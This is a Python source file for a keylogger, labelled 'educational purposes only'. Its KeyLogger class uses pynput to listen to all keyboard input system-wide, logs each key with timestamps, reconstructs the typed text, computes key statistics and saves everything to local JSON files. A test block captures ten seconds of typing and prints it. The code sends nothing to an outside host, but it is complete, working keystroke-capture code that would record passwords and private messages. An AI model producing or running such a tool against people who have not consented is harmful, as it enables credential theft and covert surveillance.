"""
Keylogger Backend Module
Educational purposes only - Use responsibly
"""

from datetime import datetime
import json
import os
from pathlib import Path
import threading
import sys

# Handle headless environment (no X server)
try:
    from pynput import keyboard
    HAS_PYNPUT = True
except ImportError as e:
    HAS_PYNPUT = False
    IMPORT_ERROR = str(e)


class KeyLogger:
    """
    A keylogger class that captures keyboard events and stores them.
    Note: Requires X server on Linux systems.
    """
    
    def __init__(self):
        if not HAS_PYNPUT:
            # Store error but continue initialization for UI compatibility
            self.import_error = IMPORT_ERROR
        
        self.logs = []
        self.listener = None
        self.is_active = False
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.text_buffer = []
        self.lock = threading.Lock()
        
        # Create logs directory if it doesn't exist
        self.logs_dir = Path("logs")
        self.logs_dir.mkdir(exist_ok=True)
    
    
    def _on_press(self, key):
        """
        Callback function for key press events
        """
        if not HAS_PYNPUT:
            return
            
        with self.lock:
            timestamp = datetime.now().isoformat()
            
            try:
                # Handle regular character keys
                if hasattr(key, 'char') and key.char is not None:
                    key_data = {
                        'timestamp': timestamp,
                        'key': key.char,
                        'type': 'regular',
                        'session': self.session_id
                    }
                    self.text_buffer.append(key.char)
                else:
                    # Handle special keys
                    key_name = str(key).replace('Key.', '')
                    key_data = {
                        'timestamp': timestamp,
                        'key': f'[{key_name}]',
                        'type': 'special',
                        'session': self.session_id
                    }
                    
                    # Handle special characters for text reconstruction
                    if key == keyboard.Key.space:
                        self.text_buffer.append(' ')
                    elif key == keyboard.Key.enter:
                        self.text_buffer.append('\n')
                    elif key == keyboard.Key.tab:
                        self.text_buffer.append('\t')
                    elif key == keyboard.Key.backspace:
                        if self.text_buffer:
                            self.text_buffer.pop()
                
                self.logs.append(key_data)
                
            except Exception as e:
                # Handle any unexpected errors
                key_data = {
                    'timestamp': timestamp,
                    'key': f'[ERROR: {str(e)}]',
                    'type': 'error',
                    'session': self.session_id
                }
                self.logs.append(key_data)
    
    def start(self):
        """
        Start the keylogger
        """
        if not HAS_PYNPUT:
            return False
            
        if not self.is_active:
            self.is_active = True
            self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            # Start the listener in a separate thread
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
            
            return True
        return False
    
    def stop(self):
        """
        Stop the keylogger
        """
        if self.is_active and self.listener:
            self.is_active = False
            self.listener.stop()
            self.listener = None
            return True
        return False
    
    def get_logs(self):
        """
        Get all captured logs
        """
        with self.lock:
            return self.logs.copy()
    
    def get_text(self):
        """
        Get reconstructed text from keystrokes
        """
        with self.lock:
            return ''.join(self.text_buffer)
    
    def clear_logs(self):
        """
        Clear all logs
        """
        with self.lock:
            self.logs = []
            self.text_buffer = []
    
    def save_logs(self, filename=None):
        """
        Save logs to a JSON file
        """
        with self.lock:
            if not self.logs:
                return None
            
            if filename is None:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = self.logs_dir / f"keylog_{timestamp}.json"
            
            data = {
                'session_id': self.session_id,
                'total_keys': len(self.logs),
                'created_at': datetime.now().isoformat(),
                'logs': self.logs,
                'reconstructed_text': ''.join(self.text_buffer)
            }
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            
            return str(filename)
    
    def load_logs(self, filename):
        """
        Load logs from a JSON file
        """
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            with self.lock:
                self.logs = data.get('logs', [])
                self.session_id = data.get('session_id', 'loaded')
                text = data.get('reconstructed_text', '')
                self.text_buffer = list(text)
            
            return True
        except Exception as e:
            print(f"Error loading logs: {e}")
            return False
    
    def get_statistics(self):
        """
        Get statistics about captured keystrokes
        """
        with self.lock:
            total = len(self.logs)
            regular = sum(1 for log in self.logs if log['type'] == 'regular')
            special = sum(1 for log in self.logs if log['type'] == 'special')
            
            # Key frequency
            key_freq = {}
            for log in self.logs:
                key = log['key']
                key_freq[key] = key_freq.get(key, 0) + 1
            
            return {
                'total_keys': total,
                'regular_keys': regular,
                'special_keys': special,
                'key_frequency': key_freq,
                'session_id': self.session_id
            }
    
    def __del__(self):
        """
        Cleanup when object is destroyed
        """
        self.stop()


if __name__ == "__main__":
    # Test the keylogger
    print("Keylogger Test - Press keys for 10 seconds...")
    
    logger = KeyLogger()
    logger.start()
    
    import time
    time.sleep(10)
    
    logger.stop()
    
    # Print results
    print("\n--- Logs ---")
    logs = logger.get_logs()
    for log in logs[:20]:  # Show first 20
        print(f"{log['timestamp']}: {log['key']} ({log['type']})")
    
    print(f"\nTotal keys captured: {len(logs)}")
    print(f"\nReconstructed text:\n{logger.get_text()}")
    
    # Save logs
    filename = logger.save_logs()
    print(f"\nLogs saved to: {filename}")
